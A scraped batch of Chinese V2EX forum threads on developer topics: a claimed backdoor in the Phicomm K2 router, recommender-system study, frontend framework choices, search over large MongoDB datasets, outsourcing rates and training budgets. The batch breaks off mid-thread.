{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>京东上售卖的 K2 路由器，购买 30 天之后返现，相当于 0 天购。想想天底下怎么会有这种好事。事实证明路由器存在后门，会截取用户的所有信息。</p>\n</div></div>"], "reply": "89", "tittle": "斐迅 K2 路由器后门，大家怎么看？", "comment": ["事实呢？证据呢？", "事实呢？证据呢？", "事实呢？证据呢？", "这个新闻很久了 而且基本上这个站的人都刷固件的…", "这是 K1 的文章 ", " 不知道是否真实，以及 K2 是否也有这个问题", " \r", " 看过文章，数据通过 ftp 上传的，用户名密码和地址都在固件里面。\r", "最坑的是这个帐号密码可以直接下载其他人的上网记录。", "拿到手 5 分钟就刷了 breed,刷了 asus 固件", "路由器成本也不高，斐迅这也相当于是个理财产品吧，路由就相当于给你的利息，不知道啥时候会翻车。", "博客广告时间到\r", "\r", "听说 K3 要发了， jd 上面预约送 1T 硬盘", "这事都好久前的了... 而且买这个路由的多数拿回来就直接刷机了", "我用了一段时间才刷，估计信息都被偷完了", "K1 那个事爆出后，感觉斐讯不大可能在 K2 上还继续搞后门，这不是作死么。\r", "而且就像我说的，这个路由的成本其实并不高，所以斐讯不大可能是赔钱卖路由+靠后门偷数据赚钱，更有可能是利用那 30 天的时间差，拿你的钱来干点什么的。", "这反射弧。。。", "应该说国产厂商不“偷 /拿”数据才怪，以前的种种新闻还不够多吗？所以还是主动刷固件吧。", "没用过，有没有后门不知道。\r", "如果主动刷的固件有后门那就搞笑了。。。\r", "\r", "还是自己拉源码编实在", " #9  ", "   ", "  \r", " ", " ", "K3 都快出来了，而且斐讯后门也不是一天两天的事了，人尽皆知。买来不就是为了刷第三方固件吗？", "后门就是代码执行刷 breed 啊", "管他呢，买来就刷 lede 了。", "刷华硕固件，搞定", "村通网", "k2 后门网上不是早曝光了。\r", "我也亲自验证过，原版系统买回来之后看计划任务里只有个定时开关 wifi 的任务还是空的，然后开了 ssh 没有刷任何 rom 直接在命令行里看 crontab ，里面有个之前没显示出来的上传任务……", "不要钱的，你还想怎样呢？", "买 k2 就是为了刷机 挂 VPN", "赶紧回去刷", "不要钱的路，路由器，听起来就很奇怪。", "有后门啊，你看下恩山里去后门官方固件里的去除方法就知道了。\r", "K3 预售了， 1999 一年返，疲劳驾驶感觉要翻车了", "而且现在新版固件好像内置广告推送了", "我不想给它我的身份证信息怎么办？", "5 分钟刷完 openwrt ，不会刷建议真没买了，划不来", "刷了别的固件应该就可以避免，但是我们要抵制这种形式。", "K2 竟然还有后门，看来我还是 too young 了。。。", "找了个华硕的固件刷，不是在官方下载的。不知道会不会有后门", " chrome57 你用的证书已经不被信任了 2333", "  \r", " \r", "1999 ， 这是要坑一笔跑路吧！", "博客广告时间~：( ", " #36 链接刚才没插入对...正确的是这个： ", "以下问题大家是怎么解决的？\r", "\r", "\r", "然而对于功放的控制是由无线驱动来控制的，这一功能是在编译驱动时确定的。对功放的控制是通过一个 GPIO 来控制的，而且是通过不同的电压来控制的。如果驱动不带这一功能，控制功放的 GPIO 引脚处于逻辑高电平状态，时间长了就很可能会烧坏功放", " 就刷个官方改版就好，其他大多数固件我都刷过，没有一个的无线信号有官方稳定的，而 k2 的主要价值就是在于它的无线和无线功放。它的其他硬件配置玩不出什么花来，尤其是那联发科芯片。\r", "\r", "mtk7620 这个芯片的无线信号是最大的坑，各种采用这个方案的路由器，我经手过几个，官方固件都不能说完美何况各种开源驱动。 k2 一个被我送人，一个扔给父母用了。我不是在黑 k2 ， k2 的无线信号比我的网件 7000 强很多……\r", "我现在的家用路由器是网件 orbi ，和我之前玩的那些已经不是一个次元的东西了，但这玩意也是最没有性价比的。", " 有官方去后门优化版，我用的就是这个，其它的都不刷。", "国产路由都这样吧 他插个广告  你说你点了不再显示 他要你发路由 mac 和电脑 mac 地址他那边查询什么原因导致你点了不再显示后  还会弹出广告来  这说明啥  远程记录日志啊  \r", "\r", "具体哪家路由这里就不说了  你们懂的", "不懂为什么要买这种垃圾...", "天下没有免费的午餐~~", "其实就是刷机的话这个路由器貌似没有开源的 uboot ，使用闭源 breed 也不是一点风险没有的。", "为啥不买来研究研究。。", "这机器不就是到手就刷机么。。不刷机你上这个车被耍着玩儿呢= =", "已刷 Padavan 固件，感觉用着还可以吧", " k3 能上吗， 1999 分几期还？", "你不说我还真不知道，还好没买。", " 还可以吧，我自己预定了还送个硬盘。估计这个路由器带下载功能吧。", " \r", " \r", "感谢已经修复顺便申请了泛域名证书。", " 直接用白条就能搞定吗", "不刷又不卖拿这种路由器来干嘛？。。。所以其实对司机们来说不是问题", " 《斐讯，这家借壳上市的路由器公司被疑自融，京东 265 万人已中招》", "上车的除了小白，其他人到手就都刷了吧……", " 真心求教，该怎么自己编译（非计算机专业，该怎么入手）", " 我看恩山说 padavan 用的是 mtk 闭源驱动并自带 pa/lna", "昨晚下载应用莫名其妙变成了 UC 浏览器，今早又没什么事。", "很久前的新闻了吧，网上有分析后门的文章==", " 怎么说呢，我当时每个固件都用过一段时间，这个毛子固件也用过，确实比其他 openwrt 好点，但玩 moba 网游做试验的话只有官方固件的断流是最少的。正常上网的话这种断流基本上影响不大。", "看到楼主的帖子，我立马下单买了一个，回来刷机。", " 搜索引擎", "你们都不介意把身份证号码卖 200 块么....", " 白条只能分期吧。对于跑路了 应该还是要自己负责的吧。", "没听说过 我准备买一个试下刷机", " 你博客有在用 CDN 吗?为什么我会看到这个\r", " 😂😂😂", " 感谢，确实用了 CDN 然后带着后台权限访问了前台文章，", " 搜了，还是放弃吧，太复杂了。", "国产路由器的套路大家都心知肚明，无非就是上传你的上网数据推送精准广告嘛。就好比微信分析你的聊天记录在朋友圈给你推送广告一样。在这个隐私不值钱的国家里，感觉眼不见心不烦是最好的解脱。", " 如果只是为了精准推送广告还好", "K3 大家还是别上车了，感觉船要翻", "撸了两个刷了潘多拉用来做 AP", " 1999 还是不敢随便上车的", " 预约送硬盘 这个会返现么", "lz 的“事实证明”在哪?", " 没有证明。谁不信谁买来不刷固件用用", " 既然 0 元购应该还会返现吧", "这个有证据吗", " \r", "我不上车了 1999 我感觉会卷一波跑路", "斐迅 k3 1999 灵车到了，有人敢上么？\r", "另外腾达（ Tenda ） AC9 也在发车，第一次才 269 ，应该更靠谱。", "  默默把 K2 和 K1 刷了個系統用 蠻好的 現在上網自帶 SS 了", "国产路由还有没后门的？", " 作为上市公司来说，最好的利益是讲故事。路由器配合大数据，比乐视的生态故事更现实更好听。话说回来，路由器作为家庭网络中转站，这块的数据如果深度分析精准推广，效果真的挺好的。", " \r", " \r", " \r", " \r", "乌云曝光过", "收集的无非是你公网 ip ssid 帐号密码 adsl 帐号密码  上网方式 罢了 别指望 7620 能分析你上网行为", " 你当真觉得你的身份证号码加手机号码加银行卡号码值 200 块钱么", "京东已经没有返现的字样了。。。  难道已经翻车了 我很惶恐 我今天刚收到货 K2", " 反正我不会入手 K3 了，撸了 4 个 K2 够了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用 python 比较好??</p>\n</div></div>"], "reply": "15", "tittle": "想学推荐系统，需要哪些基础，看什么书??", "comment": ["项亮那本吧 Python 入门的 TopN 推荐  \r", "\r", "表面上的原理不难, 做深了要研究特征工程", "《推荐系统:技术、评估及高效算法》，挺经典的一本书，讲得也很细；\r", "一般自己做着玩的话语言什么的会什么用什么好了，如果是企业应用，运算量会比较大，肯定用 c/c++处理逻辑比较快～", "《 introduction to linear algebra 》\r", "《 Calculations 》\r", "《 Possibilities and Statistics 》", "最好是简单的推荐，各种排序和随机就可以。\r", "要想讲出点数学道理，还是要补各种机器学习的基础。", "最近几天看了几篇北大 /清华博士的关于 推荐系统 协同过滤算法、机器学习 的论文。。。\r", "简直觉得自己是 小学本科", "你如果想学用在真实系统的推荐，没什么用，因为商品都可以打 tag ，买一个推荐同类其他的按谁给的钱多排列就完了\r", "\r", "如果是真的想学算法，可以考虑看看简单的，比如关联规则这些\r", "\r", "什么叫竞价排名，比如你买了番茄给你推荐柿子，这是竞价排名\r", "什么叫关联规则？检测到你买了番茄和锅给你推荐鸡蛋", " 想做类似今日头条那样的", " 学会标题党就够了，今日头条的推荐再好没用，因为内容已经从标题开始就烂到骨子里了\r", "\r", "很多人感觉今日头条的标题准因为他就喜欢标题党。。", " 说的好像你真的在做推荐系统一样，不懂就不要误导新人。\r", "\r", "\r", " 推荐系统也是从机器学习学起， svd ， cf ， fm ， ffm 这些算法也都是机器学习算法，推荐系统比较多张量分解类的算法，所以线代要学好，概率是一定要学好的。\r", "\r", "套路是这样的：《线代》《概率》 -- 《机器学习》--《推荐系统》\r", "\r", "此外需要领域知识，做文本的推荐的话，需要 NLP 的知识，比如 word embedding 如何放进推荐系统做 feature ，比如 lda 的 keyword 如何放进推荐系统做 feature ，图像推荐的话需要 CV ，那些就很多很杂了， domain language 主要对 feature engineering 起作用。\r", "\r", "你楼上说的关联规则，二十年前的做法，早就没人用了。", " 是这样的，技术虽然很厉害，但是你作为一般用户，有感觉现在国内网站推荐有多么智障么？\r", "\r", "最明显的一点，就是更换太厉害，典型的网易云，你听过一首歌至后，你发现你整个推荐都被换成这个歌的风格了，一点权重都不考虑啊\r", "\r", "淘宝一样，而且淘宝缺少一点点人为干预，或者一点个性化， 3 月末的广州，气温高达 20+度，依然在推荐冬装\r", "\r", "优酷是正好相反的，我反复看郭德纲的相声，甚至都在反复循环，首页上郭德纲的东西都是一闪而过，满屏幕的古装剧、宫斗剧\r", "\r", "而你说的 feature ，在音乐、视频这些领域反倒不重要，因为人的标注太准、太勤劳了，大家都在努力写 tag ，认真描述自己的东西，只要大类准推荐几本不会错\r", "\r", "为什么这么说他没有机器参考的因素，比如我在网易云听东方的歌，但是我听 vocal 的多，不听钢琴曲，他还会推荐一堆钢琴 rearrange 给我，说明他的标注就认了东方，而根本没分析这个音乐的更多特征\r", "\r", "你又会说了，你这么特立独行为什么我要考虑你，我要说的是，我以前上学的时候，有个公司自豪的宣传他们的算法就提到了他们发现了 10%的人喜欢找老女人。。。", " 顺便说一下， lda 我读研的时候用过， Blei 写这篇文章的时候还是 2003 年呢， 14 年前和 20 年前比一个半斤一个八两谁也别说谁\r", "\r", "其实推荐，笨想，能商用的一个分类器就够了，你说淘宝需要很复杂的算法么？他只要能区分男装和女装就够了\r", "\r", "淘宝的推荐系统，别说被你鄙视的关联规则了，他连买了 cosplay 的衣服推荐假发的能力都做不到，可能人家就认为我喜欢买衣服一直买到手剁掉", " \r", "笑尿，用过还不懂真的就只是调包侠了。\r", "人的标注从来就赶不上数据的增长速度，我们每天文章几万的进来，怎么搞人工标注？而且你说的问题，不正是人工标注太糙了，只能标注出东方，不能更细分出 vocal 和钢琴么，这是人工标注的天生弱势，很多推荐系统就是太粗了才让人觉得恶心。\r", "所以 domain language 才更重要，音乐更需要分类器来对 genre 进行精确分类。\r", "\r", "你所说的推荐系统的 bad case ，恰恰都是人工干涉太多，技术实力不够的结果。\r", "\r", "你也不懂一个 1%的指标上涨对营收有多大影响，要是懂，也不会说出“能商用的一个分类器”这种说法。\r", "\r", "而且刚搜了下，淘宝现在搜 cosplay 服装会出假发的。", " 怎么搞人工标注？那每天几万文章的标题都是机器取出来的么。。。视频选分类打 tag 不都是上传人自己搞的\r", "\r", "-----------下面属于灌水----------------\r", "我感觉与其研究推荐，不如研究一下怎么让机器给正八景的文章搞成标题党，算法一跑几万文章都震惊了", " 另外呢，我感觉这个问题没必要吵架，你的观点是算法很重要，我的观点是真实应用时人的力量可以代替很多算法，而且因为人有主观性他反而有时候比机器的算法更微妙\r", "\r", "但是考虑到我没有证据容易被喷，我特意注册了一个今日头条的号，注册的时候让选一个叫领域的东西，足足有 39 项，我自己注册的时候已经交底到这分上了，算法分不分意义不大了吧，何况有的领域我必须提交身份证明否则发了封号\r", "\r", "不知道看了这么多的楼主在干嘛，他现在连自己的目标都不明确，是快速搞一个推荐系统跑起来，还是想学高大上的理论和算法呢\r", "\r", "但是无论如何，给我的感觉现在跑的无论国内外推荐都不行，就包括 youtube 也是一边倒推荐，反倒是语音、翻译、图像搜索、输入法这些在突飞猛进的发展，而且的的却却让你感受到技术改变了生活\r", "\r", "btw,1%的指标对营收多影响我不知道， xx 头条和公众号的造谣文和震惊了让国内的通识教育回到了至少 20 年前", " 我在看你俩的对话呀，我准备一边做个简单的推荐系统，但是长远还是要学 @", " 他推荐的基础，毕竟想做个有竞争力的程序员。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>先自己写试试手，希望能开发效率高、维护成本低、设计简单、理解容易<br>\n好了，要求就这几个，求前端达人们指导指导~</p>\n</div></div>"], "reply": "23", "tittle": "前端框架是否有人推荐？写了个小站，目前是简单的 jQuery+bootstrap，是否有复杂度低，维护成本低的前端框架介绍？", "comment": ["总听闻前端框架半年一变，是否有比较靠谱、稳定的？不知道是否贪心了~ :)", "是，感觉半年不搞前端，涌现出好多工程化的工具。", " 之前搞，感觉每个类库都遵从自己的一套规范，各个类库整合特别麻烦", " 零星看了一些文章，能唤起我印象的关键词有： gulp 、 bower 、 webpack 、 grunt 、 npm 这些开发工具，还有 angular 、 vue 等一堆类库，我表示现在我已经……挑不动了", "你是程序员吗", " 日常写 Python / Scala / C++，几年前业余写点前端", " 我不是搞技术的岗位 都在用 vue （当然 以前很多选型是 bootstrap+jq ）", "Vue", "不是专业前端的话，推荐 bootstrap + jquery ，比较简单，至于 vue 、 react 还是算了吧", " \r", " 谢谢，我来试试", " 但是模块化的问题确实比较麻烦，没有模块化维护、复用的成本都有点高", "React 自身其实挺简单好用的", "小站 jQuery+bootstrap 足够了，不用刻意追新框架 /库", "bootstrap + jquery 还不够简单？？？！！！", "vue 还不够简单？？？？？？", "推荐你一个模块化的框架 layui  贼好用", "收录超多前端知名框架，个人开发者框架\r", "\r", "\r", "如果你觉得还不全，欢迎推荐。", "glup 、 bower 、 grunt 这三个都很久没更新了，现在可以直接选择 webpack 了", "打包构建使用 webpack ，依赖和包管理直接使用 npm 吧，然后 react 和 vue 这两个挑一个来用，个人推荐 vue", " 那用 vue 吧 laravel 自带的就是 bootstrap + vue", "前端框架估计还要活跃一阵，不过目前看如果没有新的理论出现的话（目前 MVVM 思想基本一桶浆糊）， Vue ， React ， angular 这三家基本稳固了", "看看趋势就知道了 ", "vue 这种，如果在本地渲染的话， 改改变量就可以把后台菜单弄出来了， js 还实现什么 store ，前端没任何安全性。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Future update will be avaiable in <a href=\"https://github.com/hantsy/angular2-sample/wiki\" rel=\"nofollow\">Github wiki pages</a>, please fork and star <a href=\"https://github.com/hantsy/angular2-sample\" rel=\"nofollow\">this repository</a> and contribute it.</p>\n<p>This series of posts demonstrates how to build a simple blog sample with Angular2, Bootstrap 4, and will provides more demononstration with Angular Material 2 and AngularFire2/Firebase in future.</p>\n<ul>\n<li><a href=\"https://github.com/hantsy/angular2-sample/wiki/1-start\" rel=\"nofollow\">Hello, Angular2</a></li>\n<li><a href=\"https://github.com/hantsy/angular2-sample/wiki/2-component\" rel=\"nofollow\">Getting started</a></li>\n<li><a href=\"https://github.com/hantsy/angular2-sample/wiki/3-http\" rel=\"nofollow\">Interact with backend APIs</a></li>\n<li><a href=\"https://github.com/hantsy/angular2-sample/wiki/4-form\" rel=\"nofollow\">Handles form submission</a></li>\n<li><a href=\"https://github.com/hantsy/angular2-sample/wiki/5-auth\" rel=\"nofollow\">Jwt token based Authentication</a></li>\n<li><a href=\"https://github.com/hantsy/angular2-sample/wiki/6-testing\" rel=\"nofollow\">Testing</a> TODO</li>\n<li><a href=\"https://github.com/hantsy/angular2-sample/wiki/material2\" rel=\"nofollow\">Angular Material 2</a> TODO</li>\n<li><a href=\"https://github.com/hantsy/angular2-sample/wiki/firebase\" rel=\"nofollow\">Create a Firebase backend application</a> TODO</li>\n</ul>\n</div></div>"], "reply": "目前尚无回", "tittle": "Getting started with Angular 2", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚刚在 Haker News 上看到的:\n<a href=\"http://lamport.azurewebsites.net/video/intro.html\" rel=\"nofollow\">http://lamport.azurewebsites.net/video/intro.html</a></p>\n</div></div>"], "reply": "3", "tittle": "看 Leslie Lamport 如何做自我介绍 [然后讲解 TLA+]", "comment": ["这里没几个人知道他 更没几个人知道 TLA+", "这个 lecture 好新啊 还是谢谢楼主了", " 会接触分布系统的话多少会知道他吧？\r", "不过 TLA+的确是没多少人用..."]},
{"content": ["<div class=\"topic_content\">问问各位大拿，就是平时自己做着玩玩想选个前端框架， AngularJS ， bootstrap 这种怎么选</div>"], "reply": "37", "tittle": "后端开发怎么选择前端框架", "comment": ["这事难道不是看需求么？", "前端框架？难道不是 vuejs ， bootstrap 算不上前端框架吧，顶多是个 CSS 组件", " 没什么特别的需求，自己玩，非要说需求就是，能快速上手，好看一点的", "jquery 你值得拥有", " 就是不懂才来问阿", "vue, 简单迅猛", "楼主要的应该就是 UI 框架\r", "bootstrap \r", "elementUI\r", "Fundation", "看要做什么东西\r", "是要一套前端模板（ AdminLTE ）？还是样式框架(BootStrap)？还是操作 dom 方便的框架(vue.js)？", "谁发一下老夫只用 jquery 那张图", "果然不问不知道，我一直以为前端框架就是 UI 框架。。。。。学习了，多谢个位", "UI 框架主要是 CSS 样式加 js 的一些常用特效\r", "前端框架主要是 JS 结构和数据绑定一些应用.\r", "你想要的应该是 UI 框架吧.\r", "推荐你个国人开发的 ", " iviewui 挺不错，开箱即用。帝都的一个哥们儿做的。。。看了看 还可以", "难道不是看需求？", "简单的需求能用 jQuery 为啥一定要用 vue 啥的", "小型项目： spring+jquery+mustache+bootstrap ，前端变化太快，目前哪个框架都不喜欢， jquery 够用了。", "UI 的话挺推荐 bootstrap 的,响应式做的挺好,基本组件都有,上手快,个人感觉设计也简洁好看...", "复制！粘贴！拿起键盘就是干！", "我是从后端开发开始的,前端选了国产的 avalonjs", "\r", "号称是为后端程序员打造的前端框架\r", "我还没用，之前看到论坛里有人推荐的", "强烈建议学个前端框架，推荐 react ，因为移动端也顺便 react native 搞定，即使项目刚开始用 jQuery 搞得定，很难保证之后各种加需求和维护也方便。如果完全不用和后端交互数据，那 jQuery 是第一选择", "你是什么后端呀？如果是 nodejs 的话我觉得直接用 react 比较容易上手。", "不懂前端还是别自己写了，直接网上找各种现成的页面得了，网上多的事，拿过来稍微改改就能用了。自己写的话浪费时间不说，写出了还贼难看。。。", "vue.js", "看一下《锋利的 jquery 》，下载 bootstrap2(对，不要用 3,太复杂了)，拿起键盘就是干", "楼主要分清是想要 js 框架还是 css 框架", " js 框架推荐 vue.js", "css 框架推荐 bootstrap 和 semantic-ui", "如果只想做 admin 控制面板之类", "前后端分离的方案推荐 element （基于 vue ）+ restful api", "后端直接出模板的方案，前端用 adminlte （基于 bootstrap + jquery ）", "如果是自己做着玩的临时项目，选个卵的 React 、 Vue ... 跑得起来就行， jQuery 功能管够， Bootstrap 颜值管够。\r", "如果你是想学前端，那再去研究这些。", "jquery+bootstrap+themeforest 上的主题", "I suggest for angular js for front end framkework.", "vue+elementUI  开发效率不错 . 你值得拥有", "后端玩 bootstrap angular 吧", " vue+elementUI +1, 公司里全是 Angularjs + bootstrap ，下班回家继续，你不觉得烦么", "bootstrap 更像后端专用的，撸界面简直不要太快，几分钟一个页面原型弄出来了。", "讲道理，我以前做的项目很多选择都是 bootstrap+jquery\r", "后来入门上手 vue 爽爆了\r", "\r", "所以 适时的提升及扩展视野 是非常重要的。\r", "\r", "ps 我并不是程序员", " #33 那你是什么...", " BA/PM/UE 多一些\r", "腾出手也能修打印机 /抠马桶。。。", " 这个看起来不错啊", "vue 啊", "Vue  element  +1"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>React Router V4 正式版发布，该版本相较于前面三个版本有根本性变化，遵循 Just Component 的 API 设计理念。</p>\n<p><a href=\"https://github.com/react-translate-team/react-router-CN\" rel=\"nofollow\">React Router V4 中文文档 on GitHub</a></p>\n<p>本次升级的主要变更有：</p>\n<ul>\n<li>声明式 Declarative</li>\n<li>可组合 Composability</li>\n</ul>\n<p>本次升级 React Router V4 吸取了 React 的理念：所有的东西都是 Component 。因此 升级之后的 Route 、 Link 、 Switch ……等都是一个普通的组件。</p>\n<p>React Router V4 基于 Lerna 管理多个 Repository 。在此代码库包括：</p>\n<ul>\n<li><strong>react-router</strong> React Router 核心</li>\n<li><strong>react-router-dom</strong> 用于 DOM 绑定的 React Router</li>\n<li><strong>react-router-native</strong> 用于 React Native 的 React Router</li>\n<li><strong>react-router-redux</strong> React Router 和 Redux 的集成</li>\n<li><strong>react-router-config</strong> 静态路由配置帮助助手</li>\n</ul>\n</div></div>"], "reply": "5", "tittle": "React Router V4 正式版发布", "comment": ["不知可否支持异步路由了？", "Angular UI Router 现在的 1.0 版本重写了，支持 AngularJS 1.x, Angular 2, React 。", "怪不得我第二天下完包就报错了……", " 破坏性升级"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在初步是 50T 的数据存在 Mongodb 里, 数据都是统一结构, 现在要对这些数据做一个搜索引擎, 有什么好的方案?\n问题比较笼统哈.</p>\n</div></div>"], "reply": "20", "tittle": "有 10T+的数据, 怎么对其做一个搜索引擎", "comment": ["elasticsearch\r", "es 或者 lucene 是全文索引，结构化搜索不太适合，我记得我当年用这类索引的时候所有字段都被转成字符串了，现在估计会好些", "es 分布式", "es ，最好的选择", "es+1", "请问一下楼上各位， es 该怎么学啊？文档看得我好晕的说😢", "es 有支持 mysql 语法插件", "竟然没有人提 solr 真是江河日下啊", "#8 说完 es 想说 solr 的给忘了哈哈", " 自行配置 Schema 就行了...\r", "如果没有配置 Schema,它会自动根据第一个写入的 Document 去猜...\r", "猜错了那也是没办法的事情...\r", "不过在结构化查询上的确效率不算太好,至少比常见的关系型数据库慢一个量级....", "顺便问下， kibana 有办法呈现 field 中的 html 吗？\r", "\r", "es 有没有能呈现 html 的 gui ？懒得自己实现了。。。", " 用 solr 不如直接上 lucene ，更 geek ，可以从底层玩出花", "sphinx 不能吗", "京东的数据？", "elk", " ", "elasticsearch", " 搞事情搞事情。", "数据结构统一的情况下， 10T 的数据用 ELK 还行，在硬件资源有瓶颈限制的情况下，比 ELK 好玩的还有 Hadoop 之流，当然还是要自身的场景需求来调整~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>技术团队分享是很多团队都会持续进行的一部分，有些团队非常重视分享。因为分享让大家有更多的交流与学习的机会，而且很多新人都比较喜欢听大神的分享：）</p>\n<p>但很多时候都面临一个比较尴尬的问题，那就是分享什么？什么方式的分享？其实都比较在意分享的质量和效果！</p>\n<p>Q ：技术团队该如何保持高效分享，并一直持续下去？</p>\n</div></div>"], "reply": "5", "tittle": "技术团队建设，分享该如何进行？", "comment": ["可以是日常开发中踩过的坑 难点 痛点的衍生\r", "举个例子\r", "比如 git 的常见使用 团队使用 git 的规范 和 git 在一些冲突 回滚 等等情况下的处理方式\r", "都是比较贴近日常使用的我觉得才是最有效果的\r", "空谈一些高并发 大流量 大数据..我觉得听听过没啥用 除非公司项目每天都顶着大流量啥的", " 嗯。谢谢，其实我也觉得分享就应该从日常大家都通用的或者常见的坑开始。或者在大家都有一定的基础的时候往比较深入的区域探讨一下：）", "反复的，深坑，每次故障都是怎么解决的，担心的，持续关注的", "感觉大团队分享通用技能和经验较好，或者分享对产品的理解也不错（避免走弯路）？\r", "\r", "小团队分享更深入的技术点或者\r", "\r", "踩过的坑可能更好。", "什么都可以分享，由当然要有资深的工程师带头，给大家新手分享一些技术总结或者思考，同时鼓励新人总结开发过程中遇到的问题和解决方案。也可以分析工作外感兴趣的技术，也可以拓宽团队的视野。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>译文地址: <a href=\"http://blog.jobbole.com/110628/\" rel=\"nofollow\">常坐电脑前面，这些健康问题你注意到了么？</a></p>\n<p>英文版地址：<a href=\"http://prog3.com/article/1970-01-01/292096\" rel=\"nofollow\">Common health problems for programmers</a></p>\n<p>作者是， Zed Shaw ，程序员，吉他手，作家，《笨方法学 Python 》的作者。</p>\n<p>原文可能已经被作者删除了。找都找不到。</p>\n</div></div>"], "reply": "4", "tittle": "[分享][常坐电脑前面，这些健康问题你注意到了么？]", "comment": ["谢谢 很好的文章", "程序员康复指南", "总结：不熬夜 不久坐", "谢分享，程序员必备"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人坐标福州，在某家公司全职前端工程师。</p>\n<p>目前打算转外包，全职的时候是 4.5k/月 ，今天签外包合同的时候看到对方给了我 150/天的价格，感觉不太能接受，打算进一步聊价格，我目前的工作经验接近一年，但还未毕业(还有 3 个月)，不太清楚外包的价格。</p>\n<p>请教一下各位我该如何报价呢？:D</p>\n</div></div>"], "reply": "47", "tittle": "外包以天计费的价格对比全职的薪资是如何计算的？", "comment": ["我都是 200/hour ，😄", "好好的干啥外包啊。。。而且钱也没多少，按照 V 友的说法，外包的工资要为正常工作的两倍才值得考虑", "震惊 200 津巴布韦币 /h 的外包吸引 v2er 蜂拥而上 究竟是人性的缺失还是道德的沦丧", "外包没关系的话 很难长期做下去的", " 想再找一份工作，这里的转外包做", " 强呀 在福州的话这个价格应该很难拿到吧", "不去参加校招 做什么外包啊", " 我 300/h ，差不多哦:P", "最近招了一个自学入门能做前后端的 PHPer ，帮我全职做外包，按照 80 元 /小时计算，另外再给每个项目 10%提成。", "做外包对自己的成长不好吧", "刚毕业，好好地找家公司全职。兼职外包。", " 福州的校招暂时感觉没什么目标，想再找一份远程，之前那家公司的项目想接下来做外包补贴下生活。", " 只是兼职，还会再找一份工作", "主要是不知道要如何报价", "市场定价和成本定价。\r", "市场定价就是去打听和你差不多水平的外包一般报什么价。\r", "成本定价大致上就是把全职工资、社保公积金、福利加一下，再加上营业成本、拉客户成本，除以每月实际工作天数，再加些风险利润。注意工作天数要扣减谈生意消耗掉时间，比如一个月有 21 天个工作日，其中 6 天用于寻找客户，那么实际工作天数只有 15 天。\r", "\r", "一般来说成本定价用来检查市场定价是否赚钱，如果成本价算出来比市场价高得多，那还是老老实实干全职吧。", "有些活儿合作， 如何联系楼主？", "前端你可以收 1500 一天", "4.5k/月，这么爽，感觉公司以后要外包前端的时候可以来谈谈了 233", "150 一个小时还可以考虑一下", " 福州这边前端的薪水低呀，早想离开这个城市了，暂时走不出去", "150 ／天。。。当年高中同学找的三本生辅导功课时薪都 100", "按天算就太老实了 要按没有轮子的开发天数算 实际用着轮子写代码(跑", "我一般 8 小时内 x2 ， 8~12 小时 x3 ， 12 小时以上 x4", "这么早就为了钱开始当搬运工了。。。", " 我也是福州的", "太少了，再加。", " #5 \r", "发个简历给我可好 有差不多的成型外网作品以及自己完成的是哪一部分说明一下\r", "\r", "\r", "可以合作合作 如果有条件让你收入翻个倍", "老乡别去，忠告，切记。", "换城市或者找楼上", "外包的话貌似能接 2 份 150/hour 和 150/hour ，那就是 300/hour 啦", "我都是 100/hr ...", "php 、 java 、 H5 、.net 、 python 、 iOS 、 Android 大量技术开放供应。希望寻求合作：）", "外包是没有标准价格的，所以你问的也是白问，能告诉你答案的都是自己水平评估出来的一个合适价位。\r", "\r", "你要计算那先从这三个入口: 个人能力 + 项目难易度 + 工作量。\r", "\r", "按天计算其实是最不划算的，还是按小时把。", "外包其实不是那么定价的....\r", "\r", "外包的定价是: 你觉得你自己的空余时间值多少钱, 获得多少钱你才愿意付出这些空余时间;", " 我在北京前端，现在想做外包筹钱，可以联系我", "我理解外包的工时报价应该是薪资的双倍 也就是你工资每天 300 那么外包工时每天 6000 的价格计算项目价格.这个计费方式一般用于兼职 像你这个基本属于全职远程的价格.", "外包最烦的不是价格\r", "现在碰到的外包很多都是\r", "我要做个啥 但我也不知道要做成啥样 你先做着我们再改\r", "然后就恶心了\r", "\r", "价格一般 但是大家目的性明确 我也愿意做\r", "就算价格开的高 这种情况我现在也不做", "外包更多的是首尾款分段付, 按时计的更准确来说是兼职\r", "\r", "外包最大的麻烦在于业务评估、理解， 还有和客户撕逼\r", "\r", "东西做完了， 客户找不到， 尾款拿不到是很常见的\r", "\r", "搞外包的工作强度远远高于 996", " 怎么联系你？  给个联系方式", "技术不到位，写代码全靠搜索，这个要按小时算的话，雇主是否会有意见？", "小道消息听说阿里外包团队一人一天 4 万", "现在 V2EX 广告团队太牛叉了", "捕风捉影的消息，就请不要拿出来说了", " 正解，真是烦得要死", "我在美国一般都是$100-$150/h", " ,V2EX 广告团队太牛叉了,,，，从那里看出，怎么理解 ？", " f827489266   我的微信号"]},
{"content": ["<div class=\"topic_content\">求推荐，偶是个 DBA</div>"], "reply": "70", "tittle": "公司有个 5000 元的培训额度，学点啥好", "comment": ["《情商和沟通技巧》", "腰椎病防治", "英语", "散打，公司以后谁也不敢跟你辩论那个语言最牛 B 了。", " \r", "这个靠谱，我们运维哥们都练拳击呢", " 这有什么好辩论的,最牛逼的只有 PHP .开发速度快又稳 PHP7 速度猛增.\r", "\r", "每当和别人说起这个我都激动地从轮椅上跳起来.", "英语，散打，游泳如果不会的话", " 严肃的冷笑话", " 悄悄的告诉你，我腰挺好的", "手抖了，按错了 。想点赞来着\r", "哥你太幽默了😂", "拳击", "街舞也行", "学开车", " 赞同~跑路时有用", " 老司机了，你懂的", "就没个正经推荐么。。。", " #17 5000 还想要正经推荐?", "我觉得可以学点安全攻防。挺好。 网上有培训班。\r", "\r", "做 iOS 的学 iOS 攻防。\r", "\r", "做 Android 的学 Android 攻防\r", "\r", "做 web 后台的学 后台入侵。\r", "\r", "做前端 的学 xss 跨站。\r", "\r", "做运维的 学 linux 内核。。", "脑力的话就学英语口语，身体最好学跳舞……", "yoga", "练胸肌", "巴西柔术", "5000 